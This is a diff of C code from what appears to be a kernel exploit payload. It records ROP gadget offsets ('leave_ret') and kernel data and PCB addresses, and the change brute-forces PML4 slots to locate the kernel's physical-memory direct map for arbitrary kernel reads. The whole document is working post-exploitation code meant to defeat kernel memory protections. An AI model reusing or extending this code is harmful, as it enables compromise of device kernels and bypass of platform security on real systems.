@@ -38,7 +38,12 @@
  *   [16]  first leave_ret offset
  *   [17..30] additional gadget offsets (up to 14 more)
  *   [31]  scan_error_code
- *   [32..61] reserved for fallback probe results
+ *   [32]  safe_read8 diagnostic (0xAAAA0001=ok, 0xDEAD0000=fault)
+ *   [33]  kdata first 8 bytes (diagnostic)
+ *   [34]  PCB first 8 bytes (diagnostic)
+ *   [35]  DMAP indices_tried (how many PML4 slots scanned)
+ *   [36]  DMAP found_idx (which PML4 index matched)
+ *   [37..61] reserved
  *   [62]  dmap_test_readback (raw bytes from DMAP read)
  *   [63]  sentinel 0xdeadbeefcafe0025
  */
@@ -291,40 +296,66 @@ int module_start(kproc_args* args)
     out[5] = td_pcb;
     out[6] = 1;  /* phase 1: DMAP test */
 
-    /* ========== Phase 1: Test if DMAP works ========== */
+    /* ========== Phase 0: Verify safe_read8 works ========== */
 
-    /* Read PML4 entry for the DMAP region itself */
+    /* Test with kdata_base — we know this is readable (we read td_pcb from it) */
+    uint64_t diag_val = 0;
+    int diag_ok = safe_read8(kdata_base, &diag_val);
+    out[32] = diag_ok ? 0xAAAA0001 : 0xDEAD0000;
+    out[33] = diag_val;  /* first 8 bytes of kdata */
+
+    /* Also test td_pcb itself */
+    uint64_t diag_pcb = 0;
+    safe_read8(td_pcb, &diag_pcb);
+    out[34] = diag_pcb;  /* first 8 bytes of PCB */
+
+    /* ========== Phase 1: Find DMAP base by brute-force ========== */
+
     uint64_t pml4_pa = cr3 & PAGE_MASK;
-    uint64_t dmap_pml4_idx = (dmap_base >> PML4_SHIFT) & PT_INDEX_MASK;
-    uint64_t pml4_dmap_entry_addr = dmap_base + pml4_pa + dmap_pml4_idx * 8;
+    int dmap_accessible = 0;
 
+    /*
+     * DMAP maps all physical RAM at a fixed VA base aligned to 512GB (1 PML4 slot).
+     * The base is kernel-half: PML4 indices 256..511.
+     * For each candidate PML4 index, compute candidate_base and try reading
+     * candidate_base + pml4_pa (the PML4 table itself via DMAP).
+     * If the read succeeds and the value looks like a present PML4 entry,
+     * we found the DMAP base.
+     *
+     * We read the PML4 entry at the CANDIDATE's OWN index — if this is truly
+     * DMAP, then pml4[candidate_idx] must be present (DMAP maps itself).
+     */
     uint64_t pml4_dmap_entry = 0;
-    int dmap_accessible = safe_read8(pml4_dmap_entry_addr, &pml4_dmap_entry);
-    out[7] = pml4_dmap_entry;
+    uint32_t found_idx = 0;
 
-    if (!dmap_accessible) {
-        /* Standard DMAP base doesn't work. Try alternate bases. */
-        uint64_t alt_bases[] = {
-            0xFFFFFC0000000000ULL,
-            0xFFFFF00000000000ULL,
-            0xFFFF800000000000ULL,
-            0xFFFFE80000000000ULL,
-        };
-        for (int i = 0; i < 4; i++) {
-            dmap_base = alt_bases[i];
-            dmap_pml4_idx = (dmap_base >> PML4_SHIFT) & PT_INDEX_MASK;
-            pml4_dmap_entry_addr = dmap_base + pml4_pa + dmap_pml4_idx * 8;
-            if (safe_read8(pml4_dmap_entry_addr, &pml4_dmap_entry)) {
-                dmap_accessible = 1;
-                out[4] = dmap_base;
-                out[7] = pml4_dmap_entry;
-                break;
-            }
+    /* Store how many indices we tried for diagnostics */
+    uint32_t indices_tried = 0;
+
+    for (uint32_t idx = 256; idx < 510; idx++) {
+        uint64_t candidate = 0xFFFF000000000000ULL | ((uint64_t)idx << PML4_SHIFT);
+        /* Try reading pml4[idx] via this candidate DMAP base */
+        uint64_t test_addr = candidate + pml4_pa + idx * 8;
+        uint64_t entry = 0;
+
+        indices_tried++;
+
+        if (safe_read8(test_addr, &entry) && (entry & PTE_PRESENT)) {
+            /* This read succeeded and entry is present — likely DMAP */
+            dmap_base = candidate;
+            pml4_dmap_entry = entry;
+            found_idx = idx;
+            dmap_accessible = 1;
+            break;
         }
     }
 
+    out[4] = dmap_base;
+    out[7] = pml4_dmap_entry;
+    out[35] = indices_tried;
+    out[36] = found_idx;
+
     if (!dmap_accessible) {
-        out[10] = 1;  /* DMAP not accessible */
+        out[10] = 1;  /* DMAP not found in any PML4 slot */
         out[31] = 0xDEAD0001;
         out32[1] = 0x0003;  /* partial result */
         out[63] = 0xdeadbeefcafe0025ULL;
